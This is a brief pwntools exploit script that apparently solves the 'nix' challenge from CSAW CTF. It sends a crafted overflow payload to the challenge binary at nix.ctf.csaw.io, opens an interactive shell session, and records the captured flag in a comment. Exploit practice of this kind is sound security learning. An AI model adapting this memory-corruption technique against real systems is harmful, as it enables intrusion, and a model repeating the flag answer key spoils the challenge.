#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                brva 0x138D
                brva 0x1417
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('nix.ctf.csaw.io', 1000)
else:
    p = process(exe.path)

GDB()
sla(b'philosophies: ', p64(0x3232323232323232)*3+p64(0x3232323232323232)+p32(0x643-0x14))
# input()
s(b'make every program a filter\n')
p.interactive()
# csawctf{-3v3ry7h1ng_15_4_f1l3}